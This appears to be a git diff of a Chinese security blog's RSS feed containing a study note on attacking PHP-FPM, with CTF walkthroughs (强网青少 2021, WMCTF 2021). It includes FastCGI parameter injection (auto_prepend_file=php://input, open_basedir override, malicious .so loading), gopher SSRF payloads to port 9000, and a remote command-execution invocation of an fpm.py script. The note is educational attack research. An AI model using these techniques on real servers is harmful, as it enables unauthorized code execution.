@@ -1,10 +1,17 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>php-fpm on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/tags/php-fpm/</link><description>Recent content in php-fpm on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 15 Nov 2021 01:58:35 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/tags/php-fpm/index.xml" rel="self" type="application/rss+xml"/><item><title>攻击PHP-FPM学习笔记</title><link>https://amiaaaz.github.io/2021/11/15/attack-php-fpm-study-notes/</link><pubDate>Mon, 15 Nov 2021 01:58:35 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/15/attack-php-fpm-study-notes/</guid><description>&lt;p>之前做题总是会见到，但并不是很懂实际的原理，有点云里雾里的，好像懂了但又没有完全懂，是时候专门来学一下咯！&lt;/p>
-&lt;p>没有什么新鲜的东西，只不过把师傅们已有的文章进行一个整合&amp;amp;重新整理，不过自己亲自过一遍手懂了很多东西，参考链接放到最后啦w&lt;/p>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>php-fpm on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/tags/php-fpm/</link><description>Recent content in php-fpm on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Thu, 18 Nov 2021 00:03:25 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/tags/php-fpm/index.xml" rel="self" type="application/rss+xml"/><item><title>攻击PHP-FPM学习笔记</title><link>https://amiaaaz.github.io/2021/11/18/attack-php-fpm-study-notes/</link><pubDate>Thu, 18 Nov 2021 00:03:25 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/18/attack-php-fpm-study-notes/</guid><description>&lt;p>之前做题总是会见到，但并不是很懂实际的原理，有点云里雾里的，好像懂了但又没有完全懂，是时候专门来学一下咯！&lt;/p>
+&lt;p>没有什么新鲜的东西，只不过把师傅们已有的文章进行一个整合&amp;amp;重新整理，参考链接放到最后啦w&lt;/p>
 &lt;h2 id="前置知识">前置知识&lt;/h2>
 &lt;h3 id="cgifastcgi">CGI/FastCGI&lt;/h3>
 &lt;p>CGI协议用于处理html这类静态文件之后出现的动态语言的解释器与webserver通信的问题，具体的实现有php-cgi&lt;/p>
 &lt;p>CGI的弊端是令webserver每次处理请求时都会fork一个cgi进程，结束后再kill，比较浪费资源，FastCGI协议就解决了这个问题，处理完请求后不会kill而是保留该进程，使它可以一次处理多个请求，这样就不用每次fork了&lt;/p>
 &lt;p>而php-fpm就是FastCGI协议的一个具体实现，作为FastCGI进程管理器（运行时有一个主进程和多个包含php解释器的worker进程来执行代码），用于接收webserver的请求&lt;/p>
+&lt;p>查看phpinfo，Sever API处一般会有三种样式：&lt;/p>
+&lt;ul>
+&lt;li>Apache 2.0 Handler&lt;/li>
+&lt;li>CGI/FastCGI&lt;/li>
+&lt;li>FPM/FastCGI&lt;/li>
+&lt;/ul>
+&lt;p>第一种把php作为apache的一个模块，相当于apache中的一个.dll或.so；第二种php-cgi.exe是一个独立的进程，web服务器也是独立的apache.exe，web服务器监听到http请求时会去调用php-cgi进程，之间通过cgi协议传递数据；而第三种fastcgi也是一种协议，它做了很多优化且常驻内存 不用每次都调用一下cgi，有辅助功能比如内存管理，垃圾处理由php-fpm来实现&lt;/p>
 &lt;h3 id="配置">配置&lt;/h3>
 &lt;p>php-fpm通信方式有tcp（本地监听9000端口）和unix socket套接字两种方式，题目中可以见到的都是tcp9000&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">apt update
@@ -23,7 +30,20 @@ apt install php7.4-fpm -y
 &lt;span style="color:#75af00">}&lt;/span>
 &lt;span style="color:#75af00">...&lt;/span>
 &lt;span style="color:#75af00">}&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="unix-socket模式">***unix socket模式&lt;/h4>
+&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="unix-socket模式">unix socket模式&lt;/h4>
+&lt;p>如果启动fpm不做改动，默认为套接字模式&lt;/p>
+&lt;p>/etc/php/7.4/fpm/pool.d/www.conf&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-ini" data-lang="ini">&lt;span style="color:#75af00">listen&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">/run/php/php7.4-fpm.sock&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>/etc/nginx/sites-enabled/default&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-ini" data-lang="ini">&lt;span style="color:#75af00">server{&lt;/span>
+&lt;span style="color:#75af00">...&lt;/span>
+&lt;span style="color:#75af00">location ~ \.php$ {&lt;/span>
+&lt;span style="color:#75af00">include snippets/fastcgi-php.conf;&lt;/span>
+&lt;span style="color:#75af00">fastcgi_pass unix:/run/php/php7.4-fpm.sock;&lt;/span>
+&lt;span style="color:#75af00">}&lt;/span>
+&lt;span style="color:#75af00">...&lt;/span>
+&lt;span style="color:#75af00">}&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后重启即可&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">service nginx start &lt;span style="color:#75715e"># reload&lt;/span>
 /etc/init.d/php7.4-fpm start &lt;span style="color:#75715e"># restart&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>如果出现报错请查看对应日志&lt;/p>
@@ -48,28 +68,28 @@ cat /var/log/php7.4-fpm.log
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>先从heder中拿到body体大小（最大2^16=65535字节），再从tcp流里读取大小等于contentLenth的body，之后还有一部分额外的padding&lt;/p>
 &lt;p>header中的type起到指定record的作用，因为FastCGI的单个record大小有限作用单一，所以我们需要一个TCP流中传输多个record，通过type来标识每个record的作用是什么，requestId做到区分每一次的请求&lt;/p>
 &lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112110643128.png" alt="image-20211112110643128">&lt;/p>
-&lt;p>当type=4时，表明消息中包含的数据为某个name-value对，比如（虽然但是，我也不知道这个主题下json渲染出来的颜色这么阴间）&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-json" data-lang="json">&lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;GATEWAY_INTERFACE&amp;#39;:&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">&amp;#39;FastCGI/1.0&amp;#39;,&lt;/span>
-&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;REQUEST_METHOD&amp;#39;:&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">&amp;#39;GET&amp;#39;,&lt;/span>
-&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;SCRIPT_FILENAME&amp;#39;:&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">&amp;#39;/var/www/html/index.php&amp;#39;,&lt;/span>
-&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;SCRIPT_NAME&amp;#39;:&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">&amp;#39;/index.php&amp;#39;,&lt;/span>
-&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;QUERY_STRING&amp;#39;:&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">&amp;#39;?a=1&amp;amp;b=2&amp;#39;,&lt;/span>
-&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;REQUEST_URI&amp;#39;:&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">&amp;#39;/index.php?a=1&amp;amp;b=2&amp;#39;,&lt;/span>
-&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;DOCUMENT_ROOT&amp;#39;:&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">&amp;#39;/var/www/html&amp;#39;,&lt;/span>
-&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;SERVER_SOFTWARE&amp;#39;:&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">&amp;#39;php/fcgiclient&amp;#39;,&lt;/span>
-&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;REMOTE_ADDR&amp;#39;:&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">&amp;#39;127.0.0.1&amp;#39;,&lt;/span>
-&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;REMOTE_PORT&amp;#39;:&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">&amp;#39;12345&amp;#39;,&lt;/span>
-&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;SERVER_ADDR&amp;#39;:&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">&amp;#39;127.0.0.1&amp;#39;,&lt;/span>
-&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;SERVER_PORT&amp;#39;:&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">&amp;#39;80&amp;#39;,&lt;/span>
-&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;SERVER_NAME&amp;#39;:&lt;/span> &lt;span style="color:#f92672">&amp;#34;localhost&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
-&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;SERVER_PROTOCOL&amp;#39;:&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">&amp;#39;HTTP/1.1&amp;#39;&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>其中&lt;code>SCRIPT_FILENAME&lt;/code>就是php-fpm会去执行的文件，由于5.3.9版本引入了&lt;code>security.limit_extensions&lt;/code>的选项，默认对后缀名限制在了php家族，所以我们可以考虑找到已存在php文件（安装时附带的php文件 可以通过&lt;code>find / -name &amp;quot;*.php&amp;quot;&lt;/code>来搜索一下默认环境 比如/usr/local/lib/php/PEAR.php），向其中注入恶意代码；而fpm支持通过设置&lt;code>FASTCGI_PARAMS&lt;/code>来动态修改php的设置，可以利用这两项&lt;/p>
+&lt;p>当type=4时，表明消息中包含的数据为某个name-value对，比如&lt;/p>
+&lt;pre tabindex="0">&lt;code>{
+'GATEWAY_INTERFACE': 'FastCGI/1.0',
+'REQUEST_METHOD': 'GET',
+'SCRIPT_FILENAME': '/var/www/html/index.php',
+'SCRIPT_NAME': '/index.php',
+'QUERY_STRING': '?a=1&amp;amp;b=2',
+'REQUEST_URI': '/index.php?a=1&amp;amp;b=2',
+'DOCUMENT_ROOT': '/var/www/html',
+'SERVER_SOFTWARE': 'php/fcgiclient',
+'REMOTE_ADDR': '127.0.0.1',
+'REMOTE_PORT': '12345',
+'SERVER_ADDR': '127.0.0.1',
+'SERVER_PORT': '80',
+'SERVER_NAME': &amp;quot;localhost&amp;quot;,
+'SERVER_PROTOCOL': 'HTTP/1.1'
+}
+&lt;/code>&lt;/pre>&lt;p>其中&lt;code>SCRIPT_FILENAME&lt;/code>就是php-fpm会去执行的文件，由于5.3.9版本引入了&lt;code>security.limit_extensions&lt;/code>的选项，默认对后缀名限制在了php家族，所以我们可以考虑找到已存在php文件（安装时附带的php文件 可以通过&lt;code>find / -name &amp;quot;*.php&amp;quot;&lt;/code>来搜索一下默认环境 比如/usr/local/lib/php/PEAR.php），向其中注入恶意代码；而fpm支持通过设置&lt;code>FASTCGI_PARAMS&lt;/code>来动态修改php的设置，可以利用这两项&lt;/p>
 &lt;pre tabindex="0">&lt;code>'PHP_VALUE': 'auto_prepend_file = php://input',
 'PHP_ADMIN_VALUE': 'allow_url_include = On'
-&lt;/code>&lt;/pre>&lt;p>来做到执行某php文件时自动包含POST内容，执行恶意代码（disable_function在php加载时就确定了，无法重写）&lt;/p>
-&lt;h2 id="攻击思路">攻击思路&lt;/h2>
+&lt;/code>&lt;/pre>&lt;p>来做到执行某php文件时自动包含POST内容，执行恶意代码（disable_function在php加载时就确定好了，无法重写）&lt;/p>
+&lt;h2 id="攻击思路例题">攻击思路&amp;amp;&amp;amp;例题&lt;/h2>
 &lt;p>伪造一个可以正常通信的FastCGI客户端，将传输的内容修改为我们的恶意payload，再发出去&lt;/p>
 &lt;h3 id="远程攻击php-fpm">远程攻击php-fpm&lt;/h3>
 &lt;p>这里是&lt;a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">p牛的脚本&lt;/a>，兼容py2&amp;amp;3，默认-p 9000，-c &lt;code>&amp;lt;?php phpinfo();?&amp;gt;&lt;/code>&lt;/p>
@@ -81,8 +101,57 @@ cat /var/log/php7.4-fpm.log
 &lt;p>需要注意的是，如果只是加载恶意.so而不执行代码，则并不需要有已存在php文件的绝对路径，用&lt;code>_&lt;/code>占位即可&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">python fpm.py target_ip _ -c &lt;span style="color:#d88200">&amp;#39;&amp;lt;?php echo `id`;exit;?&amp;gt;&amp;#39;&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112175353957.png" alt="image-20211112175353957">&lt;/p>
-&lt;h3 id="ssrf攻击本地php-fpm">***SSRF攻击本地php-fpm&lt;/h3>
-&lt;p>利用&lt;code>gopher://&lt;/code>协议可以直接传输TCP协议流，我们构造好payload之后urlencode就可以传入进行ssrf攻击了&lt;/p>
+&lt;h3 id="ssrf攻击本地php-fpm">SSRF攻击本地php-fpm&lt;/h3>
+&lt;p>利用&lt;code>gopher://&lt;/code>协议可以直接传输TCP协议流，我们构造好payload之后就可以传入进行ssrf攻击了&lt;/p>
+&lt;p>构造payload依旧使用p牛的脚本，不过做一点微小的改动；这部分可以参见后面结合ftp攻击fpm的内容，总之就照这几步走&lt;/p>
+&lt;ul>
+&lt;li>p牛脚本生成urlencode之后的tcp数据流&lt;/li>
+&lt;li>加gopher://127.0.0.1:9000前缀&lt;/li>
+&lt;li>梭！?url=gopher://127.0.0.1:9000/_xxxxxxxxxxxxxxxx&lt;/li>
+&lt;/ul>
+&lt;h4 id="强网青少-2021ssrf">[强网青少 2021]SSRF&lt;/h4>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
+&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#75715e">//like fpm?
+&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Crawl&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">){&lt;/span>
+&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">substr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">7&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">===&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://&amp;#34;&lt;/span>&lt;span style="color:#111">){&lt;/span>
+&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://127.0.0.1/&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">curl&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">){&lt;/span>
+&lt;span style="color:#111">$ch&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_init&lt;/span>&lt;span style="color:#111">();&lt;/span>
+&lt;span style="color:#75af00">curl_setopt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">CURLOPT_URL&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#75af00">curl_setopt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">CURLOPT_HEADER&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#75af00">curl_setopt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">CURLOPT_RETURNTRANSFER&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#111">$result&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">curl_exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#75af00">curl_close&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$result&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__destruct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
+&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">curl&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_COOKIE&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;login&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>&lt;span style="color:#111">){&lt;/span>
+&lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_COOKIE&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;crawldata&amp;#34;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
+&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;url&amp;#34;&lt;/span>&lt;span style="color:#111">])){&lt;/span>
+&lt;span style="color:#111">$crl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Crawl&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;url&amp;#34;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
+&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;no&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
+&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>用p牛脚本生成payload，直接ssrf伪协议好像也行？没环境，云一下了&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Crawl&lt;/span>&lt;span style="color:#111">();&lt;/span>
+&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;gopher://127.0.0.1:9001/_xxxxxxxx&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#75715e">// $a -&amp;gt; url = &amp;#34;dict://127.0.0.1:80/info&amp;#34;;
+&lt;/span>&lt;span style="color:#75715e">// $a -&amp;gt; url = &amp;#34;file:///proc/net/arp&amp;#34;;
+&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">));&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>将序列化之后的结果传入crawldata&lt;/p>
 &lt;h3 id="结合ftppasv-mode攻击本地php-fpm">结合ftp&amp;amp;PASV mode攻击本地php-fpm&lt;/h3>
 &lt;h4 id="ftp使用pasv模式转发ftp-data">ftp使用PASV模式转发ftp-data&lt;/h4>
 &lt;p>先简单测试ftp连接进行抓包&lt;/p>
@@ -200,10 +269,8 @@ cat /var/log/php7.4-fpm.log
 &lt;li>用file_put_contents('/tmp/wuhu.so',$_POST[&amp;lsquo;data&amp;rsquo;])的形式将.so传入&lt;/li>
 &lt;li>如果顺利的话open_basedir解开限制，.so被包含，就可以成功执行.so中的代码做到rce了&lt;/li>
 &lt;/ul>
-&lt;p>这里的完美栗子就是赵总的三句话（指路赵总博客-&amp;gt;&lt;a href="https://www.zhaoj.in/read-6951.html">WMCTF2021-Web-Make PHP Great Again And Again WriteUp&lt;/a>&lt;/p>
-&lt;h3 id="攻击unix-socket模式下的php-fpm">***攻击unix socket模式下的php-fpm&lt;/h3>
-&lt;h2 id="在题目中的表现">在题目中的表现&lt;/h2>
-&lt;h3 id="wmctf-2021make-php-great-again-and-again">[WMCTF 2021]Make PHP Great Again And Again&lt;/h3>
+&lt;p>这里的完美栗子当然是赵总的三句话（指路赵总博客-&amp;gt;&lt;a href="https://www.zhaoj.in/read-6951.html">WMCTF2021-Web-Make PHP Great Again And Again WriteUp&lt;/a>&lt;/p>
+&lt;h4 id="wmctf-2021make-php-great-again-and-again">[WMCTF 2021]Make PHP Great Again And Again&lt;/h4>
 &lt;p>思路先放在前面：找到fpm端口-&amp;gt;搭建恶意ftp_server 将.so文件转发至fpm端口-&amp;gt;利用.so文件执行命令-&amp;gt;拿flag&lt;/p>
 &lt;p>题目代码只有三句话&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
@@ -274,8 +341,8 @@ string(0) &amp;quot;&amp;quot;
 &lt;span style="color:#75af00">fclose&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$socket&lt;/span>&lt;span style="color:#111">);&lt;/span>
 &lt;span style="color:#111">}&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>urlencode之后传入，再扫一下端口可以看到46819开放，说明服务正常；还是用之前p牛的脚本构造，这里我们要修改的配置项是这些&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-json" data-lang="json">&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;PHP_ADMIN_VALUE&amp;#39;:&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">&amp;#39;allow_url_include&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">=&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">On\nopen_basedir&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">=&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">/\nextension&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">=&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">/tmp/wuhu.so&amp;#39;,&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>覆盖掉open_basedir的原有设置，再加上.so文件（稍后上传）；具体的payload也可以用p牛的脚本魔改一下&lt;/p>
+&lt;pre tabindex="0">&lt;code>'PHP_ADMIN_VALUE': 'allow_url_include = On\nopen_basedir = /\nextension = /tmp/wuhu.so',
+&lt;/code>&lt;/pre>&lt;p>覆盖掉open_basedir的原有设置，再加上.so文件（稍后上传）；具体的payload也可以用p牛的脚本魔改一下&lt;/p>
 &lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211113011624783.png" alt="image-20211113011624783">&lt;/p>
 &lt;p>注释掉157-159对连接状态的判断，在191创建连接前将request部分直接输出urlencode的版本然后exit(0)一波退出&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ python fpm.py 127.0.0.1 &lt;span style="color:#d88200">&amp;#39;/var/www/html/index.php&amp;#39;&lt;/span>
@@ -306,20 +373,64 @@ a=var_dump(file_put_contents('/tmp/wuhu.so',$_POST['data']));&amp;amp;data=xxxxx
 &lt;p>之后又尝试了很多次，.so正常上传，最开始打向fpm的流量也又打了几遍，失败；再之后.so也不能正常上传了，最初的那个流量也打不成了，只能回显int(xxx)，但是没有eval()的回显，说明还是不正常，然后他妈的，间或有一两次能成功，甚至我都又在/tmp目录下写了别的文件（如果前面的流量没正常打出去的话是绝对不可能做到的，肯定是bool(false)），但是但是但是又是一秒破功，真是不理解了，完全是跟前面一模一样的payload，但是就他妈玄学，吐了&lt;/p>
 &lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211115014616324.png" alt="image-20211115014616324">&lt;/p>
 &lt;p>不想再耗太多时间在这个题上了，实在是绷不住了（调了快1天了），基本也算是打通了（毕竟就差一点点啊啊啊啊啊 我截图还有呢）（其实是懒的重置docker再尝试了 我的），我猜测出错的点在于那个开在46819端口的ftp服务器不稳定，它在处理这边ftp打出的流量时可能没有正常的处理，再加上来回调整payload打了太多次了，可能之前的错误累积到后面，比如某次没有urlencode之类的，搞得环境也不正常了&lt;/p>
-&lt;h3 id="蓝帽杯-2021one-pointer-php">***[蓝帽杯 2021]One Pointer PHP&lt;/h3>
+&lt;h4 id="蓝帽杯-2021one-pointer-php">***[蓝帽杯 2021]One Pointer PHP&lt;/h4>
 &lt;hr>
